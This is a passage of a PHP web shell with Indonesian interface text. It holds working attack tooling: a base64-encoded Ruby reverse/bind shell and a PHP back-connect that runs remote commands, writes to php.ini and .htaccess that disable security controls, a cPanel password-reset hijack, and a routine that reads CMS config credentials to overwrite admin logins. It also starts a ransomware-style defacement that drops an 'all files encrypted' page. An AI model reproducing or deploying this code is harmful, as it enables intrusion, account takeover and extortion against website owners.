		$becaak = base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
		$pbcaak = @fopen('bcruby.rb','w');
		fwrite($pbcaak,$becaak);
		$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
		sleep(1);
		echo "<pre class='text-light'>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
		unlink("bcruby.rb");
	}
	if($_POST['backconnect'] == 'php'){
		$ip = $_POST['server'];
		$port = $_POST['port'];
		$sockfd = fsockopen($ip , $port , $errno, $errstr );
		if($errno != 0){
			echo "<font color='red'>$errno : $errstr</font>";
		}else if (!$sockfd){
			$result = "<p>Unexpected error has occured, connection may have failed.</p>";
		}else{
			fputs ($sockfd ,"
			\n{#######################################}
			\n..:: BackConnect PHP By Con7ext ::..
			\n{#######################################}\n");
			$dir = @shell_exec("pwd");
			$sysinfo = @shell_exec("uname -a");
			$time = @Shell_exec("time");
			$len = 1337;
			fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
			while(!feof($sockfd)){
				$cmdPrompt = '[kuda]#:> ';
				@fputs ($sockfd , $cmdPrompt );
				$command= fgets($sockfd, $len);
				@fputs($sockfd , "\n" . @shell_exec($command) . "\n\n");
			}
			@fclose($sockfd);
		}
	}
	exit;
}
function disabFunc($dir,$file){
	echo "<div class='card card-body text-center text-dark'>
		<h4 class='text-center mt-2 mb-3'>Bypass Disable Functions</h2>
		<form method='POST'>
			<input type='submit' class='btn btn-danger' name='ini' value='php.ini'/>
			<input type='submit' class='btn btn-danger' name='htce' value='.htaccess'/>
			<input type='submit' class='btn btn-danger' name='litini' value='Litespeed'/>
		</form>";
		if(isset($_POST['ini'])){
			$file = fopen("php.ini","w");
			echo fwrite($file,"safe_mode = OFF\ndisable_functions = NONE");
			fclose($file);
			echo "<a href='php.ini' class='btn btn-success btn-block' target='_blank'>Klik Coeg!</a>";
		}elseif(isset($_POST['htce'])){
			$file = fopen(".htaccess","w");
			echo fwrite($file,"<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
			fclose($file);
			echo "<p>.htaccess successfully created!</p>";
		}elseif(isset($_POST['litini'])){
			$iniph = "PD8gZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbImZpbGUiXSk7DQplY2hvIGluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOw0KZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbInNzIl07DQo/Pg==";
			$byph = "safe_mode = OFF\ndisable_functions = NONE";
			$comp = "<Files *.php>\nForceType application/x-httpd-php4\n</Files>";
			file_put_contents("php.ini",$byph);
			file_put_contents("ini.php",$iniph);
			file_put_contents(".htaccess",$comp);
			$swa = "success";
			$text = "Disable Functions in Litespeed Created";
			swall($swa,$text,$dir);
		}
	echo "</div>";
}
function resetCp($dir){
	echo '<h5 class="text-center mb-4"><i class="fa fa-key"></i> Auto Reset Password Cpanel</h5>
	<form method="POST">
		<div class="form-group input-group">
			<div class="input-group-prepend">
				<div class="input-group-text"><i class="fa fa-envelope"></i></div>
				</div>
				<input type="email" name="email" class="form-control" placeholder="Input Email..."/>
			</div>
			<input type="submit" name="submit" class="btn btn-danger btn-block" value="Send"/>
		</div>
	</form>';
	if(isset($_POST['submit'])){
		$user = get_current_user();
		$site = $_SERVER['HTTP_HOST'];
		$ips = getenv('REMOTE_ADDR');
		$email = $_POST['email'];
		$wr = 'email:'.$email;
		$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
		@fwrite($f, $wr); 
		@fclose($f);
		$f = fopen('/home/'.$user.'/.contactinfo', 'w');
		@fwrite($f, $wr); 
		@fclose($f);
		$parm = $site.':2082/resetpass?start=1';
		echo '<br/>Url: '.$parm.'';
		echo '<br/>Username: '.$user.'';
		echo '<br/>Success Reset To: '.$email.'<br/><br/>';
	}
	exit;
}
function autoEdit($dir,$file){
	if($_POST['hajar']){
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6){
			echo "Username dan Password harus lebih dari 6 karakter";
		}else{
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf){
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)){
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == ''){
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					}else{
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/WordPress/",$config)){
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == ''){
					$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
					}else{
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/Magento|Mage_Core/",$config)){
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == ''){
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
					}else{
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)){
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == ''){
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
					}else{
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)){
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == ''){
						$target2 = $result[url];
						$url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						if($target2 == ''){
							$url_target2 = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
						}else{
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)){
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							}elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)){
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							}else{
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					}else{
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)){
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						}elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)){
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						}else{
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/Error, Tidak dapat mengambil nama domainnya/', $url_target)){
						echo $url_target2;
					}else{
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db){
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					}else{
						echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	}else{
		echo "<h3 class='text-center mb-4'>Auto Edit User</h3>
		<form method='post'>
			<h5>Lokasi Dir Config</h5>
			<input type='text' class='form-control mb-3' name='config_dir' value='$dir'>
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='HSS' class='form-control mb-3' placeholder='Set Username'>
			<input type='text' name='pass_baru' value='HSS' class='form-control mb-4' placeholder='Set Password'>
			<input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block'>
		</form>
		<p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
	}
	exit;
}
function ransom($dir,$file){
	if(isset($_POST["runransom"])) {
		$dir = $_POST["path"];
		class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaFuck")){
      rename(".htaccess", ".htaFuck");
      if(fwrite(fopen('.htaccess', 'w'), "DirectoryIndex index.php\r\nErrorDocument 404 index.php\r\nErrorDocument 500 index.php\r\nErrorDocument 403 index.php\r\n")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("index.php", base64_decode("CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICAgPGhlYWQ+CgkgIDx0aXRsZT5BbGwgWW91ciBXZWJz
aXRlIERhdGFiYXNlIEZpbGVzIEFyZSBFbmNyeXB0ZWQ8L3RpdGxlPgogICAgICA8bWV0YSBodHRw
LWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+
CiAgICAgIDxtZXRhIGNvbnRlbnQ9IkgkJF9SQCQwTTNXM1IiIG5hbWU9ImRlc2NyaXB0aW9uIi8+
CiAgICAgIDxtZXRhIGNvbnRlbnQ9IkgkJF9SQCQwTTNXM1IiIG5hbWU9ImtleXdvcmRzIi8+CiAg
ICAgIDxtZXRhIHByb3BlcnR5PSJvZzppbWFnZSIgY29udGVudD0iaHR0cDovL3MyOS5wb3N0aW1n
Lm9yZy83cnUycTc2amIva2N3X2xvZ29fZGVmYWNlLnBuZyIgLz4KCiAgICAgIDxsaW5rIGhyZWY9
Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUJsYWNrK09wcytPbmV8TW9u
dHNlcnJhdHxDYWJpbitTa2V0Y2h8T3JiaXRyb258QXJjaGl0ZWN0cytEYXVnaHRlcnxQZXJtYW5l
bnQrTWFya2VyfEx1Y2tpZXN0K0d1eXxDaGVycnkrQ3JlYW0rU29kYSIgcmVsPSJzdHlsZXNoZWV0
IiAvPgogICAgICA8bGluayBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgv
bGlicy9hbmltYXRlLmNzcy8zLjUuMi9hbmltYXRlLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIg
Lz4KICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xp
YnMvZm9udC1hd2Vzb21lLzQuNy4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyIgcmVsPSJzdHls
ZXNoZWV0IiAvPgogICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRw
Oi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS1sYXRlc3QubWluLmpzIj48L3NjcmlwdD4KICAgICAg
CgogICAgICA8IS0tIENTUyBTVEFSVCBIRVJFIC0tPgogICAgICA8c3R5bGU+CgkJIGh0bWwsIGJv
ZHkge21pbi1oZWlnaHQ6IDEwMCU7fQogICAgICAgICBib2R5IHsKCQkgd2lkdGg6IDEwMCU7CgkJ
IGhlaWdodDogMTAwJTsKICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICBwYWRkaW5nOiAwOwog
ICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2h0dHBzOi8vaW1hZ2VzNC5hbHBoYWNvZGVy
cy5jb20vNjM0L3RodW1iLTE5MjAtNjM0NDQuanBnJyk7CiAgICAgICAgIGJhY2tncm91bmQtY29s
b3I6ICMwMDA7CiAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7CiAgICAgICAg
IGJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsKICAgICAgICAgYmFja2dyb3VuZC1zaXplOiAx
NTAlOwogICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgICBjb2xvcjogI0ZG
RkZGRjsKICAgICAgICAgZm9udC1mYW1pbHk6Ik9yYml0cm9uIjsKICAgICAgICAgZm9udC1zaXpl
OiAxNHB0OwogICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgIHRleHQtZGVjb3Jh
dGlvbjogbm9uZTsKICAgICAgICAgfSAKICAgICAgICAgYSB7IHRleHQtZGVjb3JhdGlvbjogbm9u
ZTsgfQogICAgICAgICAudmlzIHsKCQkgIHRleHQtc2hhZG93OiAycHggMnB4IDJweCAjMDAwOwoJ
CSB9CiAgICAgICAgIC5nbG93IHsKICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCAxMHB4ICNGNTk3
MDA7CiAgICAgICAgIGZvbnQtZmFtaWx5OiJCbGFjayBPcHMgT25lIjsKICAgICAgICAgfQogICAg
ICAgICAuYmx1ZWdsb3cgewogICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDEwcHggIzBGNkZCRDsK
ICAgICAgICAgZm9udC1mYW1pbHk6IkJsYWNrIE9wcyBPbmUiCiAgICAgICAgIH0KICAgICAgICAg
LndoaXRlZ2xvdywuZ3cgewogICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDVweCAjRkZGRkZGOwog
ICAgICAgICBmb250LWZhbWlseToiQmxhY2sgT3BzIE9uZSI7CiAgICAgICAgIH0KCiAgICAgICAg
ICNoZWxsbyB7CiAgICAgICAgIGZvbnQtc2l6ZTogMjBweDsKICAgICAgICAgLW1vei10cmFuc2l0
aW9uOiBjb2xvciAxczsKICAgICAgICAgLXdlYmtpdC10cmFuc2l0aW9uOiBjb2xvciAxczsKICAg
ICAgICAgLW1zLXRyYW5zaXRpb246IGNvbG9yIDFzOwogICAgICAgICAtby10cmFuc2l0aW9uOiBj
b2xvciAxczsKICAgICAgICAgdHJhbnNpdGlvbjogY29sb3IgMS4yczsKICAgICAgICAgZm9udC1m
YW1pbHk6IkJsYWNrIE9wcyBPbmUiCiAgICAgICAgIH0KICAgICAgICAgI2hlbGxvOmhvdmVyIHsK
ICAgICAgICAgY29sb3I6IHllbGxvdzsKICAgICAgICAgLXdlYmtpdC1zdHJva2Utd2lkdGg6IDEw
cHg7CiAgICAgICAgIC13ZWJraXQtc3Ryb2tlLWNvbG9yOiAjRkZGRkZGOwogICAgICAgICAtd2Vi
a2l0LWZpbGwtY29sb3I6ICNGRkZGRkY7CiAgICAgICAgIHRleHQtc2hhZG93OiAxcHggMHB4IDIw
cHggcmVkOwogICAgICAgICBmb250LWZhbWlseToiQmxhY2sgT3BzIE9uZSIKICAgICAgICAgfQog
ICAgICAgICAuY24xLC5nZyB7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgMTNweCAjNTdmOTI3
OwogICAgICAgICBmb250LWZhbWlseToiQmxhY2sgT3BzIE9uZSI7CiAgICAgICAgIH0KICAgICAg
ICAgLmNuYSwuZ28gewogICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDEzcHggI2Y5OTkxZDsKICAg
ICAgICAgZm9udC1mYW1pbHk6IkJsYWNrIE9wcyBPbmUiOwogICAgICAgICB9CiAgICAgICAgIC5n
ciB7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgMTNweCByZWQ7CiAgICAgICAgIGZvbnQtZmFt
aWx5OiJCbGFjayBPcHMgT25lIjsKICAgICAgICAgfQogICAgICAgICAua2N3aW1nIHsgCiAgICAg
ICAgIHdpZHRoOiAxNjBweDsKICAgICAgICAgaGVpZ2h0OiAxNDBweDsgCiAgICAgICAgIH0gCiAg
ICAgICAgIC5jYXBzIHsKICAgICAgICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKICAgICAg
ICAgZm9udC1mYW1pbHk6ICJDYWJpbiBTa2V0Y2giOwogICAgICAgICB9CgogICAgICAgICAjbmVv
bmZvbnQKICAgICAgICAgewogICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDVweCByZWQ7CiAgICAg
ICAgIC13ZWJraXQtdHJhbnNpdGlvbjogdGV4dC1zaGFkb3cgMnMgZWFzZS1vdXQ7CiAgICAgICAg
IC1tb3otdHJhbnNpdGlvbjogdGV4dC1zaGFkb3cgMnMgZWFzZS1vdXQ7CiAgICAgICAgIC1vLXRy
YW5zaXRpb246IHRleHQtc2hhZG93IDJzIGVhc2Utb3V0OwogICAgICAgICB0cmFuc2l0aW9uOiB0
ZXh0LXNoYWRvdyAycyBlYXNlLW91dDsKICAgICAgICAgZm9udC1zaXplOjM1cHg7CiAgICAgICAg
IGZvbnQtd2VpZ2h0OiBib2xkZXI7CiAgICAgICAgIH0KICAgICAgICAgI25lb25mb250OmhvdmVy
ewogICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDMwcHggcmVkOwogICAgICAgICB9CiAgICAgICAg
